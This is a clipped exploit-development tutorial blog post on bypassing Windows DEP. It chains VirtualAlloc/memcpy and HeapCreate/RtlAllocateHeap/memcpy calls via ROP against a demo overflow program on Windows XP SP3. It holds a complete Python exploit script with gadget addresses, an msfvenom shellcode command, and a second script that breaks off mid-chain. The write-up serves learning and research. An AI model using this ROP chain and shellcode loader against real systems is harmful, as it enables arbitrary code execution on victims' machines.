---
title: "[Learning] Bypassing DEP: Chaining APIs | ISSAC/iss4cf0ng's blog"
source: https://iss4cf0ng.github.io/2026/10/04/2026-10-4-DEP/
source_host: iss4cf0ng.github.io
clip_date: 2026-10-10T01:10:34+08:00
trace_id: 82d8f8ef-7f7e-42c0-b070-17a7e1704169
content_hash: 4c8025f68d2e8fc4ab62e15f2b403c64c8fa04442439ae088e0302fca9153683
status: synced
tags:
  - Windows逆向
  - 漏洞分析
series: null
feed_source: iss4cf0ng·漏洞利用学习
ai_summary: 通过 ROP 链串联 VirtualAlloc+memcpy（或 HeapCreate+RtlAllocateHeap+memcpy），可实现分配可执行内存、拷贝 shellcode 并跳转执行，从而绕过 DEP。
ai_summary_style: key-points
images_status:
  total: 30
  succeeded: 30
  failed_urls: []
notion_page_id: 3f475244-d011-8144-8b2d-d02419da616c
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 通过 ROP 链串联 VirtualAlloc+memcpy（或 HeapCreate+RtlAllocateHeap+memcpy），可实现分配可执行内存、拷贝 shellcode 并跳转执行，从而绕过 DEP。
> 
> - **核心思路：** 先用 `VirtualAlloc`（`0x1000`/`MEM_COMMIT` + `0x40`/`PAGE_EXECUTE_READWRITE`）分配 RWX 内存，再用 `memcpy` 把 shellcode 拷入，最后 `jmp eax` 执行；第六种方法用 `HeapCreate` + `RtlAllocateHeap` 替代分配步骤。
> - **关键难点：** 无足够栈空间直接传参，需先做栈迁移（如 `add esp,0x1C`），并把 ROP1/ROP2 等改参序列放在参数之后，避免加 gadget 后反复重算偏移。
> - **EAX 保存：** API 返回值在 x86 下存于 `EAX`（`VirtualAlloc` 返回新内存地址），必须先用 `XCHG EAX,ECX` 等保存，再复用 `EAX` 计算 `memcpy` 参数。
> - **布局技巧：** 设置 `EDI = ESP + 0x200` 扩大可用空间；找不到足够大的 `add esp` gadget 时，把小的 `add esp,0x3C` 嵌进其它 ROP 的 padding 里，分多次调整栈。
> - **实测环境：** Windows XP SP3，`vulnerable001.exe` 溢出偏移 140 字节；第六种方法改用较小的 `calc.exe` payload，因为 MessageBox payload 过大覆盖关键数据导致失败。

## Introduction

This article is part of my series: **[From Bug To Exploit](https://iss4cf0ng.github.io/FromBugToExploit)**.

In [the previous article](https://iss4cf0ng.github.io/2026/09/27/2026-9-27-DEP/), I mentioned six common methods to bypass DEP:

1.  `ZwSetInformationProcess`
2.  `SetProcessDEPPolicy`
3.  `VirtualProtect`
4.  `WriteProcessMemory`
5.  `VirtualAlloc & memcpy`
6.  `HeapCreate & HeapAlloc & memcpy`

Since the fifth and sixth methods are similar, I will cover both of them in this article.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/bfe0c4c8cdc8f962.png)

## VirtualAlloc

According to the [Microsoft Learn documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc), `VirtualAlloc` reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. Memory allocated by this function is automatically initialized to zero.

> **Note:** This API only works with the current process. To allocate memory in the address space of another process, use the `VirtualAllocEx` function.

```cpp
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

The parameters are described as follows:

-   `lpAddress`: The starting address of the region to allocate.
-   `dwSize`: The size of the region to allocate, in bytes.
-   `flAllocationType`: The type of memory allocation to perform. In this example, we use `MEM_COMMIT` (`0x1000`).
-   `flProtect`: The memory protection for the allocated pages. In this example, we use `PAGE_EXECUTE_READWRITE` (`0x40`).

Let’s take a look at the implementation of `VirtualAlloc` in WinDbg:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2b5669f67c654473.png)

```
0:000> uf kernel32!VirtualAlloc

kernel32!VirtualAlloc:
7c809c11 8bff            mov     edi,edi
7c809c13 55              push    ebp
7c809c14 8bec            mov     ebp,esp
7c809c16 ff7514          push    dword ptr [ebp+14h]
7c809c19 ff7510          push    dword ptr [ebp+10h]
7c809c1c ff750c          push    dword ptr [ebp+0Ch]
7c809c1f ff7508          push    dword ptr [ebp+8]
7c809c22 6aff            push    0FFFFFFFFh
7c809c24 e809000000      call    kernel32!VirtualAllocEx (7c809c32)
7c809c29 5d              pop     ebp
7c809c2a c21000          ret     10h
```

## memcpy

According to the [Microsoft Learn documentation](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170), `memcpy` copies a specified number of bytes from one buffer to another. I think most of my readers are already familiar with this function, as it is commonly associated with buffer overflow vulnerabilities.

```c
void *memcpy(
  void *dest,
  const void *src,
  size_t count
);

wchar_t *wmemcpy(
  wchar_t *dest,
  const wchar_t *src,
  size_t count
);
```

The parameters are described as follows:

-   `dest`: A pointer to the destination buffer.
-   `src`: A pointer to the source buffer.
-   `count`: The number of bytes to copy when using `memcpy`, or the number of wide characters to copy when using `wmemcpy`.

Let’s take a look at the implementation of `memcpy` in WinDbg:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/26adcfc8e1332d70.png)

```
0:000> uf ntdll!memcpy
Flow analysis was incomplete, some code may be missing
ntdll!memcpy:
7eb31db3 55              push    ebp
7eb31db4 8bec            mov     ebp,esp
7eb31db6 57              push    edi
7eb31db7 56              push    esi
7eb31db8 8b750c          mov     esi,dword ptr [ebp+0Ch]
7eb31dbb 8b4d10          mov     ecx,dword ptr [ebp+10h]
7eb31dbe 8b7d08          mov     edi,dword ptr [ebp+8]
7eb31dc1 8bc1            mov     eax,ecx
7eb31dc3 8bd1            mov     edx,ecx
7eb31dc5 03c6            add     eax,esi
7eb31dc7 3bfe            cmp     edi,esi
7eb31dc9 7608            jbe     ntdll!memcpy+0x20 (7eb31dd3)

ntdll!memcpy+0x18:
7eb31dcb 3bf8            cmp     edi,eax
7eb31dcd 0f827d010000    jb      ntdll!memcpy+0x198 (7eb31f50)

ntdll!memcpy+0x20:
7eb31dd3 f7c703000000    test    edi,3
7eb31dd9 7514            jne     ntdll!memcpy+0x3c (7eb31def)

ntdll!memcpy+0x28:
7eb31ddb c1e902          shr     ecx,2
7eb31dde 83e203          and     edx,3
7eb31de1 83f908          cmp     ecx,8
7eb31de4 7229            jb      ntdll!memcpy+0x5c (7eb31e0f)

ntdll!memcpy+0x33:
7eb31de6 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
7eb31de8 ff2495001fb37e  jmp     dword ptr ntdll!memcpy+0x148 (7eb31f00)[edx*4]

ntdll!memcpy+0x3c:
7eb31def 8bc7            mov     eax,edi
7eb31df1 ba03000000      mov     edx,3
7eb31df6 83e904          sub     ecx,4
7eb31df9 720c            jb      ntdll!memcpy+0x54 (7eb31e07)

ntdll!memcpy+0x48:
7eb31dfb 83e003          and     eax,3
7eb31dfe 03c8            add     ecx,eax
7eb31e00 ff2485141eb37e  jmp     dword ptr ntdll!memcpy+0x61 (7eb31e14)[eax*4]

ntdll!memcpy+0x54:
7eb31e07 ff248d101fb37e  jmp     dword ptr ntdll!memcpy+0x158 (7eb31f10)[ecx*4]

ntdll!memcpy+0x5c:
7eb31e0f ff248d901eb37e  jmp     dword ptr ntdll!memcpy+0xdc (7eb31e90)[ecx*4]

ntdll!memcpy+0x198:
7eb31f50 8d7431fc        lea     esi,[ecx+esi-4]
7eb31f54 8d7c39fc        lea     edi,[ecx+edi-4]
7eb31f58 f7c703000000    test    edi,3
7eb31f5e 7524            jne     ntdll!memcpy+0x1cc (7eb31f84)

ntdll!memcpy+0x1a8:
7eb31f60 c1e902          shr     ecx,2
7eb31f63 83e203          and     edx,3
7eb31f66 83f908          cmp     ecx,8
7eb31f69 720d            jb      ntdll!memcpy+0x1c0 (7eb31f78)

ntdll!memcpy+0x1b3:
7eb31f6b fd              std
7eb31f6c f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
7eb31f6e fc              cld
7eb31f6f ff2495a020b37e  jmp     dword ptr ntdll!memcpy+0x2e0 (7eb320a0)[edx*4]

ntdll!memcpy+0x1c0:
7eb31f78 f7d9            neg     ecx
7eb31f7a ff248d4820b37e  jmp     dword ptr ntdll!memcpy+0x290 (7eb32048)[ecx*4]

ntdll!memcpy+0x1cc:
7eb31f84 8bc7            mov     eax,edi
7eb31f86 ba03000000      mov     edx,3
7eb31f8b 83f904          cmp     ecx,4
7eb31f8e 720c            jb      ntdll!memcpy+0x1e4 (7eb31f9c)

ntdll!memcpy+0x1d8:
7eb31f90 83e003          and     eax,3
7eb31f93 2bc8            sub     ecx,eax
7eb31f95 ff2485a01fb37e  jmp     dword ptr ntdll!memcpy+0x1e8 (7eb31fa0)[eax*4]

ntdll!memcpy+0x1e4:
7eb31f9c ff248da020b37e  jmp     dword ptr ntdll!memcpy+0x2e0 (7eb320a0)[ecx*4]
```

## HeapCreate

According to the [Microsoft Learn documentation](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate), `HeapCreate` creates a private heap object that can be used by the calling process. The function reserves space in the process’s virtual address space and allocates physical storage for a specified initial portion of this memory region.

```cpp
HANDLE HeapCreate(
  [in] DWORD  flOptions,
  [in] SIZE_T dwInitialSize,
  [in] SIZE_T dwMaximumSize
);
```

The parameters are described as follows:

-   `flOptions`: The heap allocation options. These options affect subsequent operations on the heap through calls to heap functions.
-   `dwInitialSize`: The initial size of the heap, in bytes.
-   `dwMaximumSize`: The maximum size of the heap, in bytes.

Let’s take a look at the implementation of `HeapCreate` in WinDbg:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/851a45bf80f6945d.png)

```powershell
0:000> uf kernel32!HeapCreate
kernel32!HeapCreate:
7c812871 8bff            mov     edi,edi
7c812873 55              push    ebp
7c812874 8bec            mov     ebp,esp
7c812876 8b4508          mov     eax,dword ptr [ebp+8]
7c812879 8b0d3c60887c    mov     ecx,dword ptr [kernel32!BaseStaticServerData (7c88603c)]
7c81287f 8b892c010000    mov     ecx,dword ptr [ecx+12Ch]
7c812885 8b5510          mov     edx,dword ptr [ebp+10h]
7c812888 2505000400      and     eax,40005h
7c81288d 56              push    esi
7c81288e 0d00100000      or      eax,1000h
7c812893 33f6            xor     esi,esi
7c812895 3bd1            cmp     edx,ecx
7c812897 7336            jae     kernel32!HeapCreate+0x3c (7c8128cf)

kernel32!HeapCreate+0x28:
7c812899 85d2            test    edx,edx
7c81289b 752e            jne     kernel32!HeapCreate+0x36 (7c8128cb)

kernel32!HeapCreate+0x2c:
7c81289d c1e104          shl     ecx,4
7c8128a0 8bf1            mov     esi,ecx
7c8128a2 83c802          or      eax,2

kernel32!HeapCreate+0x38:
7c8128a5 85f6            test    esi,esi
7c8128a7 7426            je      kernel32!HeapCreate+0x3c (7c8128cf)

kernel32!HeapCreate+0x44:
7c8128a9 6a00            push    0
7c8128ab 6a00            push    0
7c8128ad ff750c          push    dword ptr [ebp+0Ch]
7c8128b0 52              push    edx
7c8128b1 6a00            push    0
7c8128b3 50              push    eax
7c8128b4 ff151813807c    call    dword ptr [kernel32!_imp__RtlCreateHeap (7c801318)]
7c8128ba 8bf0            mov     esi,eax
7c8128bc 85f6            test    esi,esi
7c8128be 0f8427e30200    je      kernel32!HeapCreate+0x5b (7c840beb)

kernel32!HeapCreate+0x62:
7c8128c4 8bc6            mov     eax,esi
7c8128c6 5e              pop     esi
7c8128c7 5d              pop     ebp
7c8128c8 c20c00          ret     0Ch

kernel32!HeapCreate+0x36:
7c8128cb 8bd1            mov     edx,ecx
7c8128cd ebd6            jmp     kernel32!HeapCreate+0x38 (7c8128a5)

kernel32!HeapCreate+0x3c:
7c8128cf 39550c          cmp     dword ptr [ebp+0Ch],edx
7c8128d2 76d5            jbe     kernel32!HeapCreate+0x44 (7c8128a9)

kernel32!HeapCreate+0x41:
7c8128d4 e90ae30200      jmp     kernel32!HeapCreate+0x41 (7c840be3)

kernel32!HeapCreate+0x41:
7c840be3 8b550c          mov     edx,dword ptr [ebp+0Ch]
7c840be6 e9be1cfdff      jmp     kernel32!HeapCreate+0x44 (7c8128a9)

kernel32!HeapCreate+0x5b:
7c840beb 6a08            push    8
7c840bed e88c88fcff      call    kernel32!SetLastError (7c80947e)
7c840bf2 e9cd1cfdff      jmp     kernel32!HeapCreate+0x62 (7c8128c4)
```

## HeapAlloc / RtlAllocateHeap

According to the [Microsoft Learn documentation](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc), `HeapAlloc` allocates a block of memory from a heap. The allocated memory is not movable.

```cpp
DECLSPEC_ALLOCATOR LPVOID HeapAlloc(
  [in] HANDLE hHeap,
  [in] DWORD  dwFlags,
  [in] SIZE_T dwBytes
);
```

The parameters are described as follows:

-   `hHeap`: A handle to the heap from which memory will be allocated.
-   `dwFlags`: The heap allocation options.
-   `dwBytes`: The number of bytes to allocate.

However, during my experiment, I was unable to exploit this API successfully. Therefore, I decided to try another similar API, `RtlAllocateHeap`:

```cpp
NTSYSAPI PVOID RtlAllocateHeap(
  [in]           PVOID  HeapHandle,
  [in, optional] ULONG  Flags,
  [in]           SIZE_T Size
);
```

According to the [Microsoft Learn documentation](https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlallocateheap), `RtlAllocateHeap` provides functionality similar to that of `HeapAlloc`.

The disassembled code of this API is shown below:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/43ff7c3bc4616a53.png)

## The Fifth Method

## Preparation

So far, we can infer that the fifth and sixth methods follow a similar principle: we allocate an executable memory region, copy the payload into it, and then execute the shellcode.

These two methods are more difficult to implement than the others because they involve chaining multiple APIs together. As a result, they require more space in memory. In the `vulnerable001.exe` demo, the offset required to trigger the buffer overflow is `140` bytes. In other words, the available space may impose some restrictions on our ROP chain.

Let’s first organize the memory layout as we did in the previous articles:

```sql
edi-0x30    : padding A
edi-0x10    : calling VirtualAlloc
edi-0x0c    : padding B
edi-0x04    : memcpy
edi         : the first parameter of VirtualAlloc; we use the value 0
edi+0x04    : the second parameter, 0x180
edi+0x08    : the third parameter, 0x1000
edi+0x0c    : the fourth parameter, 0x40
edi+0x10    : jmp eax, memcpy; after memcpy returns, execution reaches this address. EAX holds the dynamically generated address of the shellcode
edi+0x14    : the first parameter of memcpy; we use EAX
edi+0x18    : the second parameter, the dynamically generated address of the shellcode
edi+0x1c    : the third parameter; we use the value 0x180
edi+0x20    : padding D; 140 bytes from padding A trigger the buffer overflow
edi+0x5c    : ROP
...
edi+...     : shellcode
```

However, this layout **does not work** because we don’t know the value of `EAX` after calling `VirtualAlloc`. Therefore, we cannot pass the correct value as the first parameter to `memcpy`.

Now, let’s consider the following memory layout:

```sql
edi-0x30    : padding A
edi-0x10    : calling VirtualAlloc
edi-0x0c    : padding B
edi-0x04    : stack pivot of size 0x14. This sets ESP = edi+0x24 and executes ROP1. Execution reaches this point after VirtualAlloc returns
edi         : the first parameter of VirtualAlloc; we use the value 0
edi+0x04    : the second parameter, 0x180
edi+0x08    : the third parameter, 0x1000
edi+0x0c    : the fourth parameter, 0x40
edi+0x10    : calling memcpy
edi+0x14    : jmp eax. Execution reaches this address after memcpy returns
edi+0x18    : the first parameter of memcpy
edi+0x1c    : the second parameter, the starting address of the shellcode
edi+0x20    : the third parameter, 0x180
edi+0x24    : ROP1, configuring the first parameter of memcpy
edi+...     : padding C, causing a buffer overflow
edi+0x5c    : ROP2, configuring EDI and the second parameter of memcpy, then calling VirtualAlloc
edi+...     : padding D
edi+0x200   : shellcode
```

Unfortunately, this layout doesn’t work either because the space reserved for the ROP chain is too small.

So, how can we overcome this limitation? We can reorganize the memory layout by setting `EDI = IESP + 0x200`, where `IESP` is the value of `ESP` when the buffer overflow occurs.

With this adjustment, the memory layout becomes:

```sql
edi-0x290   : padding A
edi-0x204   : ROP1, configuring EDI; ROP2, calling VirtualAlloc
edi-...     : padding B
edi         : calling VirtualAlloc
edi+0x04    : padding C
edi+0x0c    : stack pivot of size 0x1c
edi+0x10    : the first parameter of VirtualAlloc; the value is 0
edi+0x14    : the second parameter, 0x180
edi+0x18    : the third parameter, 0x1000
edi+0x1c    : the fourth parameter, 0x40
edi+0x20    : calling memcpy
edi+0x24    : padding D
edi+0x2c    : jmp eax. After memcpy returns, execution reaches this address and jumps to the shellcode
edi+0x30    : the first parameter of memcpy, dynamically determined by the value returned in EAX after VirtualAlloc is called
edi+0x34    : the second parameter, edi+0x140, the dynamically determined address of the shellcode
edi+0x38    : the third parameter, 0x180
edi+0x3c    : ROP3, configuring the parameters of memcpy; ROP4, calling memcpy
edi+...     : padding D, filling the space up to a total offset of 0x5c
edi+0x140   : shellcode
```

> **Note:** According to the documentation on [Microsoft Learn](https://learn.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170) and [Wikipedia](https://en.wikipedia.org/wiki/X86_calling_conventions), API return values are typically stored in `EAX` on 32-bit x86 systems. Therefore, we need to preserve the value returned by `VirtualAlloc` before overwriting `EAX`. In this layout, we save the value from `EAX` into `ECX` before reusing `EAX`.

## Writing the ROP Exploit Script

The completed ROP exploit script is shown below:

```python
# exploit.py

import struct

def p32(addr: int) -> bytes:
    return struct.pack('<I', addr)

def read_shellcode(file: str = 'messagebox.bin') -> bytes:
    shellcode = b''
    with open(file, 'rb') as f:
        shellcode = f.read()

    return shellcode

def fifth_sword() -> bytes:
    # initialize EDI
    rop1 = b''
    rop1 += p32(0x7eb9a880) # PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eba556e) # ADD EAX,100 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111' # retn 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eba556e) # ADD EAX,100 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7c81e4c9) # MOV EDI,EAX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}

    # call VirtualAlloc
    rop2 = b''
    rop2 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # pop esi
    rop2 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop2 += b'2222' # pop ebp
    rop2 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop2 += b'2222' # pop ebp
    rop2 += p32(0x7eb9a9e3) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08
    rop2 += b'2222' # pop ebp

    # set the first arg of memcpy
    rop3 = b''
    rop3 += p32(0x77c14001) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop esi 
    rop3 += p32(0x7eb95689) # ADD EAX,10 # POP ESI # POP EBP # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop esi
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c1d7f5) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3' * 0x10
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop ebp

    # the second parameter of memcpy, saving src (edi+0x140) to [edi+0x34]
    rop3 += p32(0x77c14001) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop esi
    rop3 += p32(0x7eba556e) # ADD EAX,100 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eba5560) # ADD EAX,40 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c14001) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eb5c81b) # ADD EAX,2 # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # retn 0x04
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # retn 0x04
    rop3 += b'3333' # pop ebp

    # call memcpy
    rop4  = b''
    rop4 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop4 += b'4444' # pop esi
    rop4 += p32(0x77c1c8f0) # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop4 += b'4444' # pop ebp
    rop4 += p32(0x7eb9a9e3) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08
    rop4 += b'4444' # pop ebp

    padding_A = b'A' * 0x8c
    padding_B = b'B' * 0x1c4
    addr_virtualalloc = p32(0x7c809c11)
    padding_C = b'C' * 0x08
    stack_pivot = p32(0x77c51e73) # ADD ESP,1C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    va_arg1 = p32(0x0)
    va_arg2 = p32(0x180)
    va_arg3 = p32(0x1000)
    va_arg4 = p32(0x40)
    addr_memcpy = p32(0x7eb31db3)
    padding_D = b'D' * 0x08
    jmp_eax = p32(0x7c85f1bc) # jmp eax
    m_arg1_2 = p32(0) * 2
    m_arg3 = p32(0x180)
    padding_E = b'E' * 0x5c
    nops = b'\x90' * 16

    shellcode = read_shellcode()

    exploit = b''
    exploit += padding_A
    exploit += rop1
    exploit += rop2
    exploit += padding_B
    exploit += addr_virtualalloc # VirtualAlloc
    exploit += padding_C
    exploit += stack_pivot
    exploit += va_arg1
    exploit += va_arg2
    exploit += va_arg3
    exploit += va_arg4
    exploit += addr_memcpy # memcpy
    exploit += padding_D
    exploit += jmp_eax
    exploit += m_arg1_2
    exploit += m_arg3
    exploit += rop3
    exploit += rop4
    exploit += padding_E
    exploit += nops
    exploit += shellcode

    return exploit

def main():
    exploit = fifth_sword()

    with open('exploit_dep.txt', 'wb') as f:
        f.write(exploit)

    print('[+] OK')

if __name__ == '__main__':
    main()
```

Now, let’s try to exploit `vulnerable.c` on a Windows XP SP3 virtual machine.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/56b6f3c6c27573bb.png)

Here, we can see that the value of `EAX` has changed. As shown in the memory dump, the shellcode has been copied to the destination address.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/92a765cbb69ccad6.png)

We have successfully executed the shellcode!

## The Sixth Method

So far, I have been able to follow the procedures described in my textbook. However, my textbook only introduces the sixth method without providing an exploit script. Therefore, I decided to implement it myself.

Writing a ROP exploit script for the sixth method is much more difficult than for the fifth method, even though both methods follow the same basic idea.

The most challenging part of chaining multiple APIs is organizing the memory layout. Here, I’d like to share some of the lessons I learned during the process:

1.  Always place `rop1`, `rop2`, and other ROP sequences that modify parameters **after the parameters themselves**. Otherwise, we would need to recalculate the offsets every time we add a gadget or padding.
    
2.  If we cannot find an `add esp` gadget with a sufficiently large offset, we can use multiple stack adjustments instead. We can place these gadgets within the padding of other ROP sequences.
    

For example:

```python
exploit += addr_rtlallocateheap # ntdll!RtlAllocateHeap
exploit += padding_D
exploit += add_esp_3c
exploit += b'E' * 4
exploit += ah_arg2
exploit += ah_arg3
exploit += rop3
exploit += rop4
exploit += addr_memcpy # ntdll!memcpy
exploit += padding_I
exploit += padding_I
exploit += jmp_eax
exploit += m_arg1_2
exploit += m_arg3
exploit += rop5
exploit += rop6
exploit += nops
```

After calling `ntdll!RtlAllocateHeap`, we need to execute `rop5` and `rop6`. However, the gap between `ntdll!RtlAllocateHeap` and `rop5` is too large.

In this case, a single `add esp, 0x3C` gadget is not sufficient. Therefore, I also added this gadget to the padding of other ROP sequences:

```python
rop3 += p32(0x7eb95689) # ADD EAX,10 # POP ESI # POP EBP # RETN 0x10    ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}
rop3 += b'3333' # pop esi
rop3 += b'3333' # pop ebp
rop3 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN    ** [ntdll.dll] ** | {PAGE_EXECUTE_READ}
#rop3 += b'3' * 0x10
rop3 += b'3333'
rop3 += b'3333'
rop3 += add_esp_3c
rop3 += b'3333'
rop3 += b'3333' # pop ebp

# ...

rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
#rop4 += b'4444' # pop ebp
rop4 += add_esp_3c
rop4 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
rop4 += b'4444' # pop ebp
```

As a result, when `rop3` and `rop4` are executed for the first time, some of these instructions will not execute as intended. However, they can be executed later, after other APIs have been called.

With these adjustments, the completed exploit script can be implemented as follows:

```python
# exploit.py

import struct

def p32(addr: int) -> bytes:
    return struct.pack('<I', addr)

# msfvenom -p windows/exec -b "\x00\x0a\x1a\x20\x0c\x0d\x09\x0b" CMD="calc" > calc.bin
def read_shellcode(file: str = 'calc.bin') -> bytes:
    shellcode = b''
    with open(file, 'rb') as f:
        shellcode = f.read()

    return shellcode

def sixth_sword() -> bytes:

    add_esp_8 = p32(0x00402516) # ADD ESP,8 # RETN    ** [vulnerable001.exe] **   |  startnull,asciiprint,ascii {PAGE_EXECUTE_READ}
    add_esp_10 = p32(0x77c526c6) # ADD ESP,10 # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    add_esp_1c = p32(0x77c51e73) # ADD ESP,1C # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    add_esp_3c = p32(0x004019f7) # ADD ESP,3C # RETN    ** [vulnerable001.exe] **   |  startnull {PAGE_EXECUTE_READ}

     # initialize EDI
    rop1 = b''
    rop1 += p32(0x7eb9a880) # PUSH ESP # ADD BH,BH # DEC ECX # POP EAX # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eba556e) # ADD EAX,100 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111' # retn 0x04
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7eba556e) # ADD EAX,100 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop1 += b'1111' # pop ebp
    rop1 += p32(0x7c81e4c9) # MOV EDI,EAX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}

    rop2 = b''
    rop2 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop2 += b'2222' # pop esi
    rop2 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop2 += b'2222' # pop ebp
    rop2 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop2 += b'2222' # pop ebp
    rop2 += p32(0x7eb9a9e3) # PUSH EAX # SUB AL,8B # DEC ECX # OR AL,1 # DEC EAX # POP ESP # POP EBP # RETN 0x08
    rop2 += b'2222' # pop ebp

    # the first argument of RtlAllocateHeap
    rop3 = b''
    rop3 += p32(0x77c14001) # XCHG EAX,ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += p32(0x77c34dc2) # MOV EAX,EDI # POP ESI # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop esi 
    rop3 += p32(0x7eba2ef2) # ADD EAX,20 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x77c47844) # ADD EAX,-2 # POP EBP # RETN
    rop3 += b'3333' # pop ebp
    #rop3 += p32(0x77c1f2c1) # ADD EAX,8 # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += p32(0x7eb95689) # ADD EAX,10 # POP ESI # POP EBP # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
    rop3 += b'3333' # pop esi
    rop3 += b'3333' # pop ebp
    rop3 += p32(0x7eba5686) # MOV DWORD PTR DS:[EAX],ECX # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
